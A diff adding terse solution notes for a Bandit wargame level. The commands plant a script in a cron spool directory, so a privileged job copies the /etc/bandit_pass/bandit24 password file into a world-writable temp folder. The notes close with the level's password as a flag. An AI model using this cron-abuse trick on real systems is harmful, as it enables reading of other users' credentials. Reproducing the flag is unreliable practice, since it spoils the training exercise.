@@ -1,0 +1,16 @@
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+
+mktemp -d
+cd /tmp/tmp.Kh4cz2gEvB
+
+#PASS.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.Kh4cz2gEvB/result
+
+chmod +x PASS.sh
+chmod 777 /tmp/tmp.Kh4cz2gEvB
+cp PASS.sh /var/spool/bandit24/foo/
+cat /var/spool/bandit24/foo/PASS.sh
+
+Flag: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
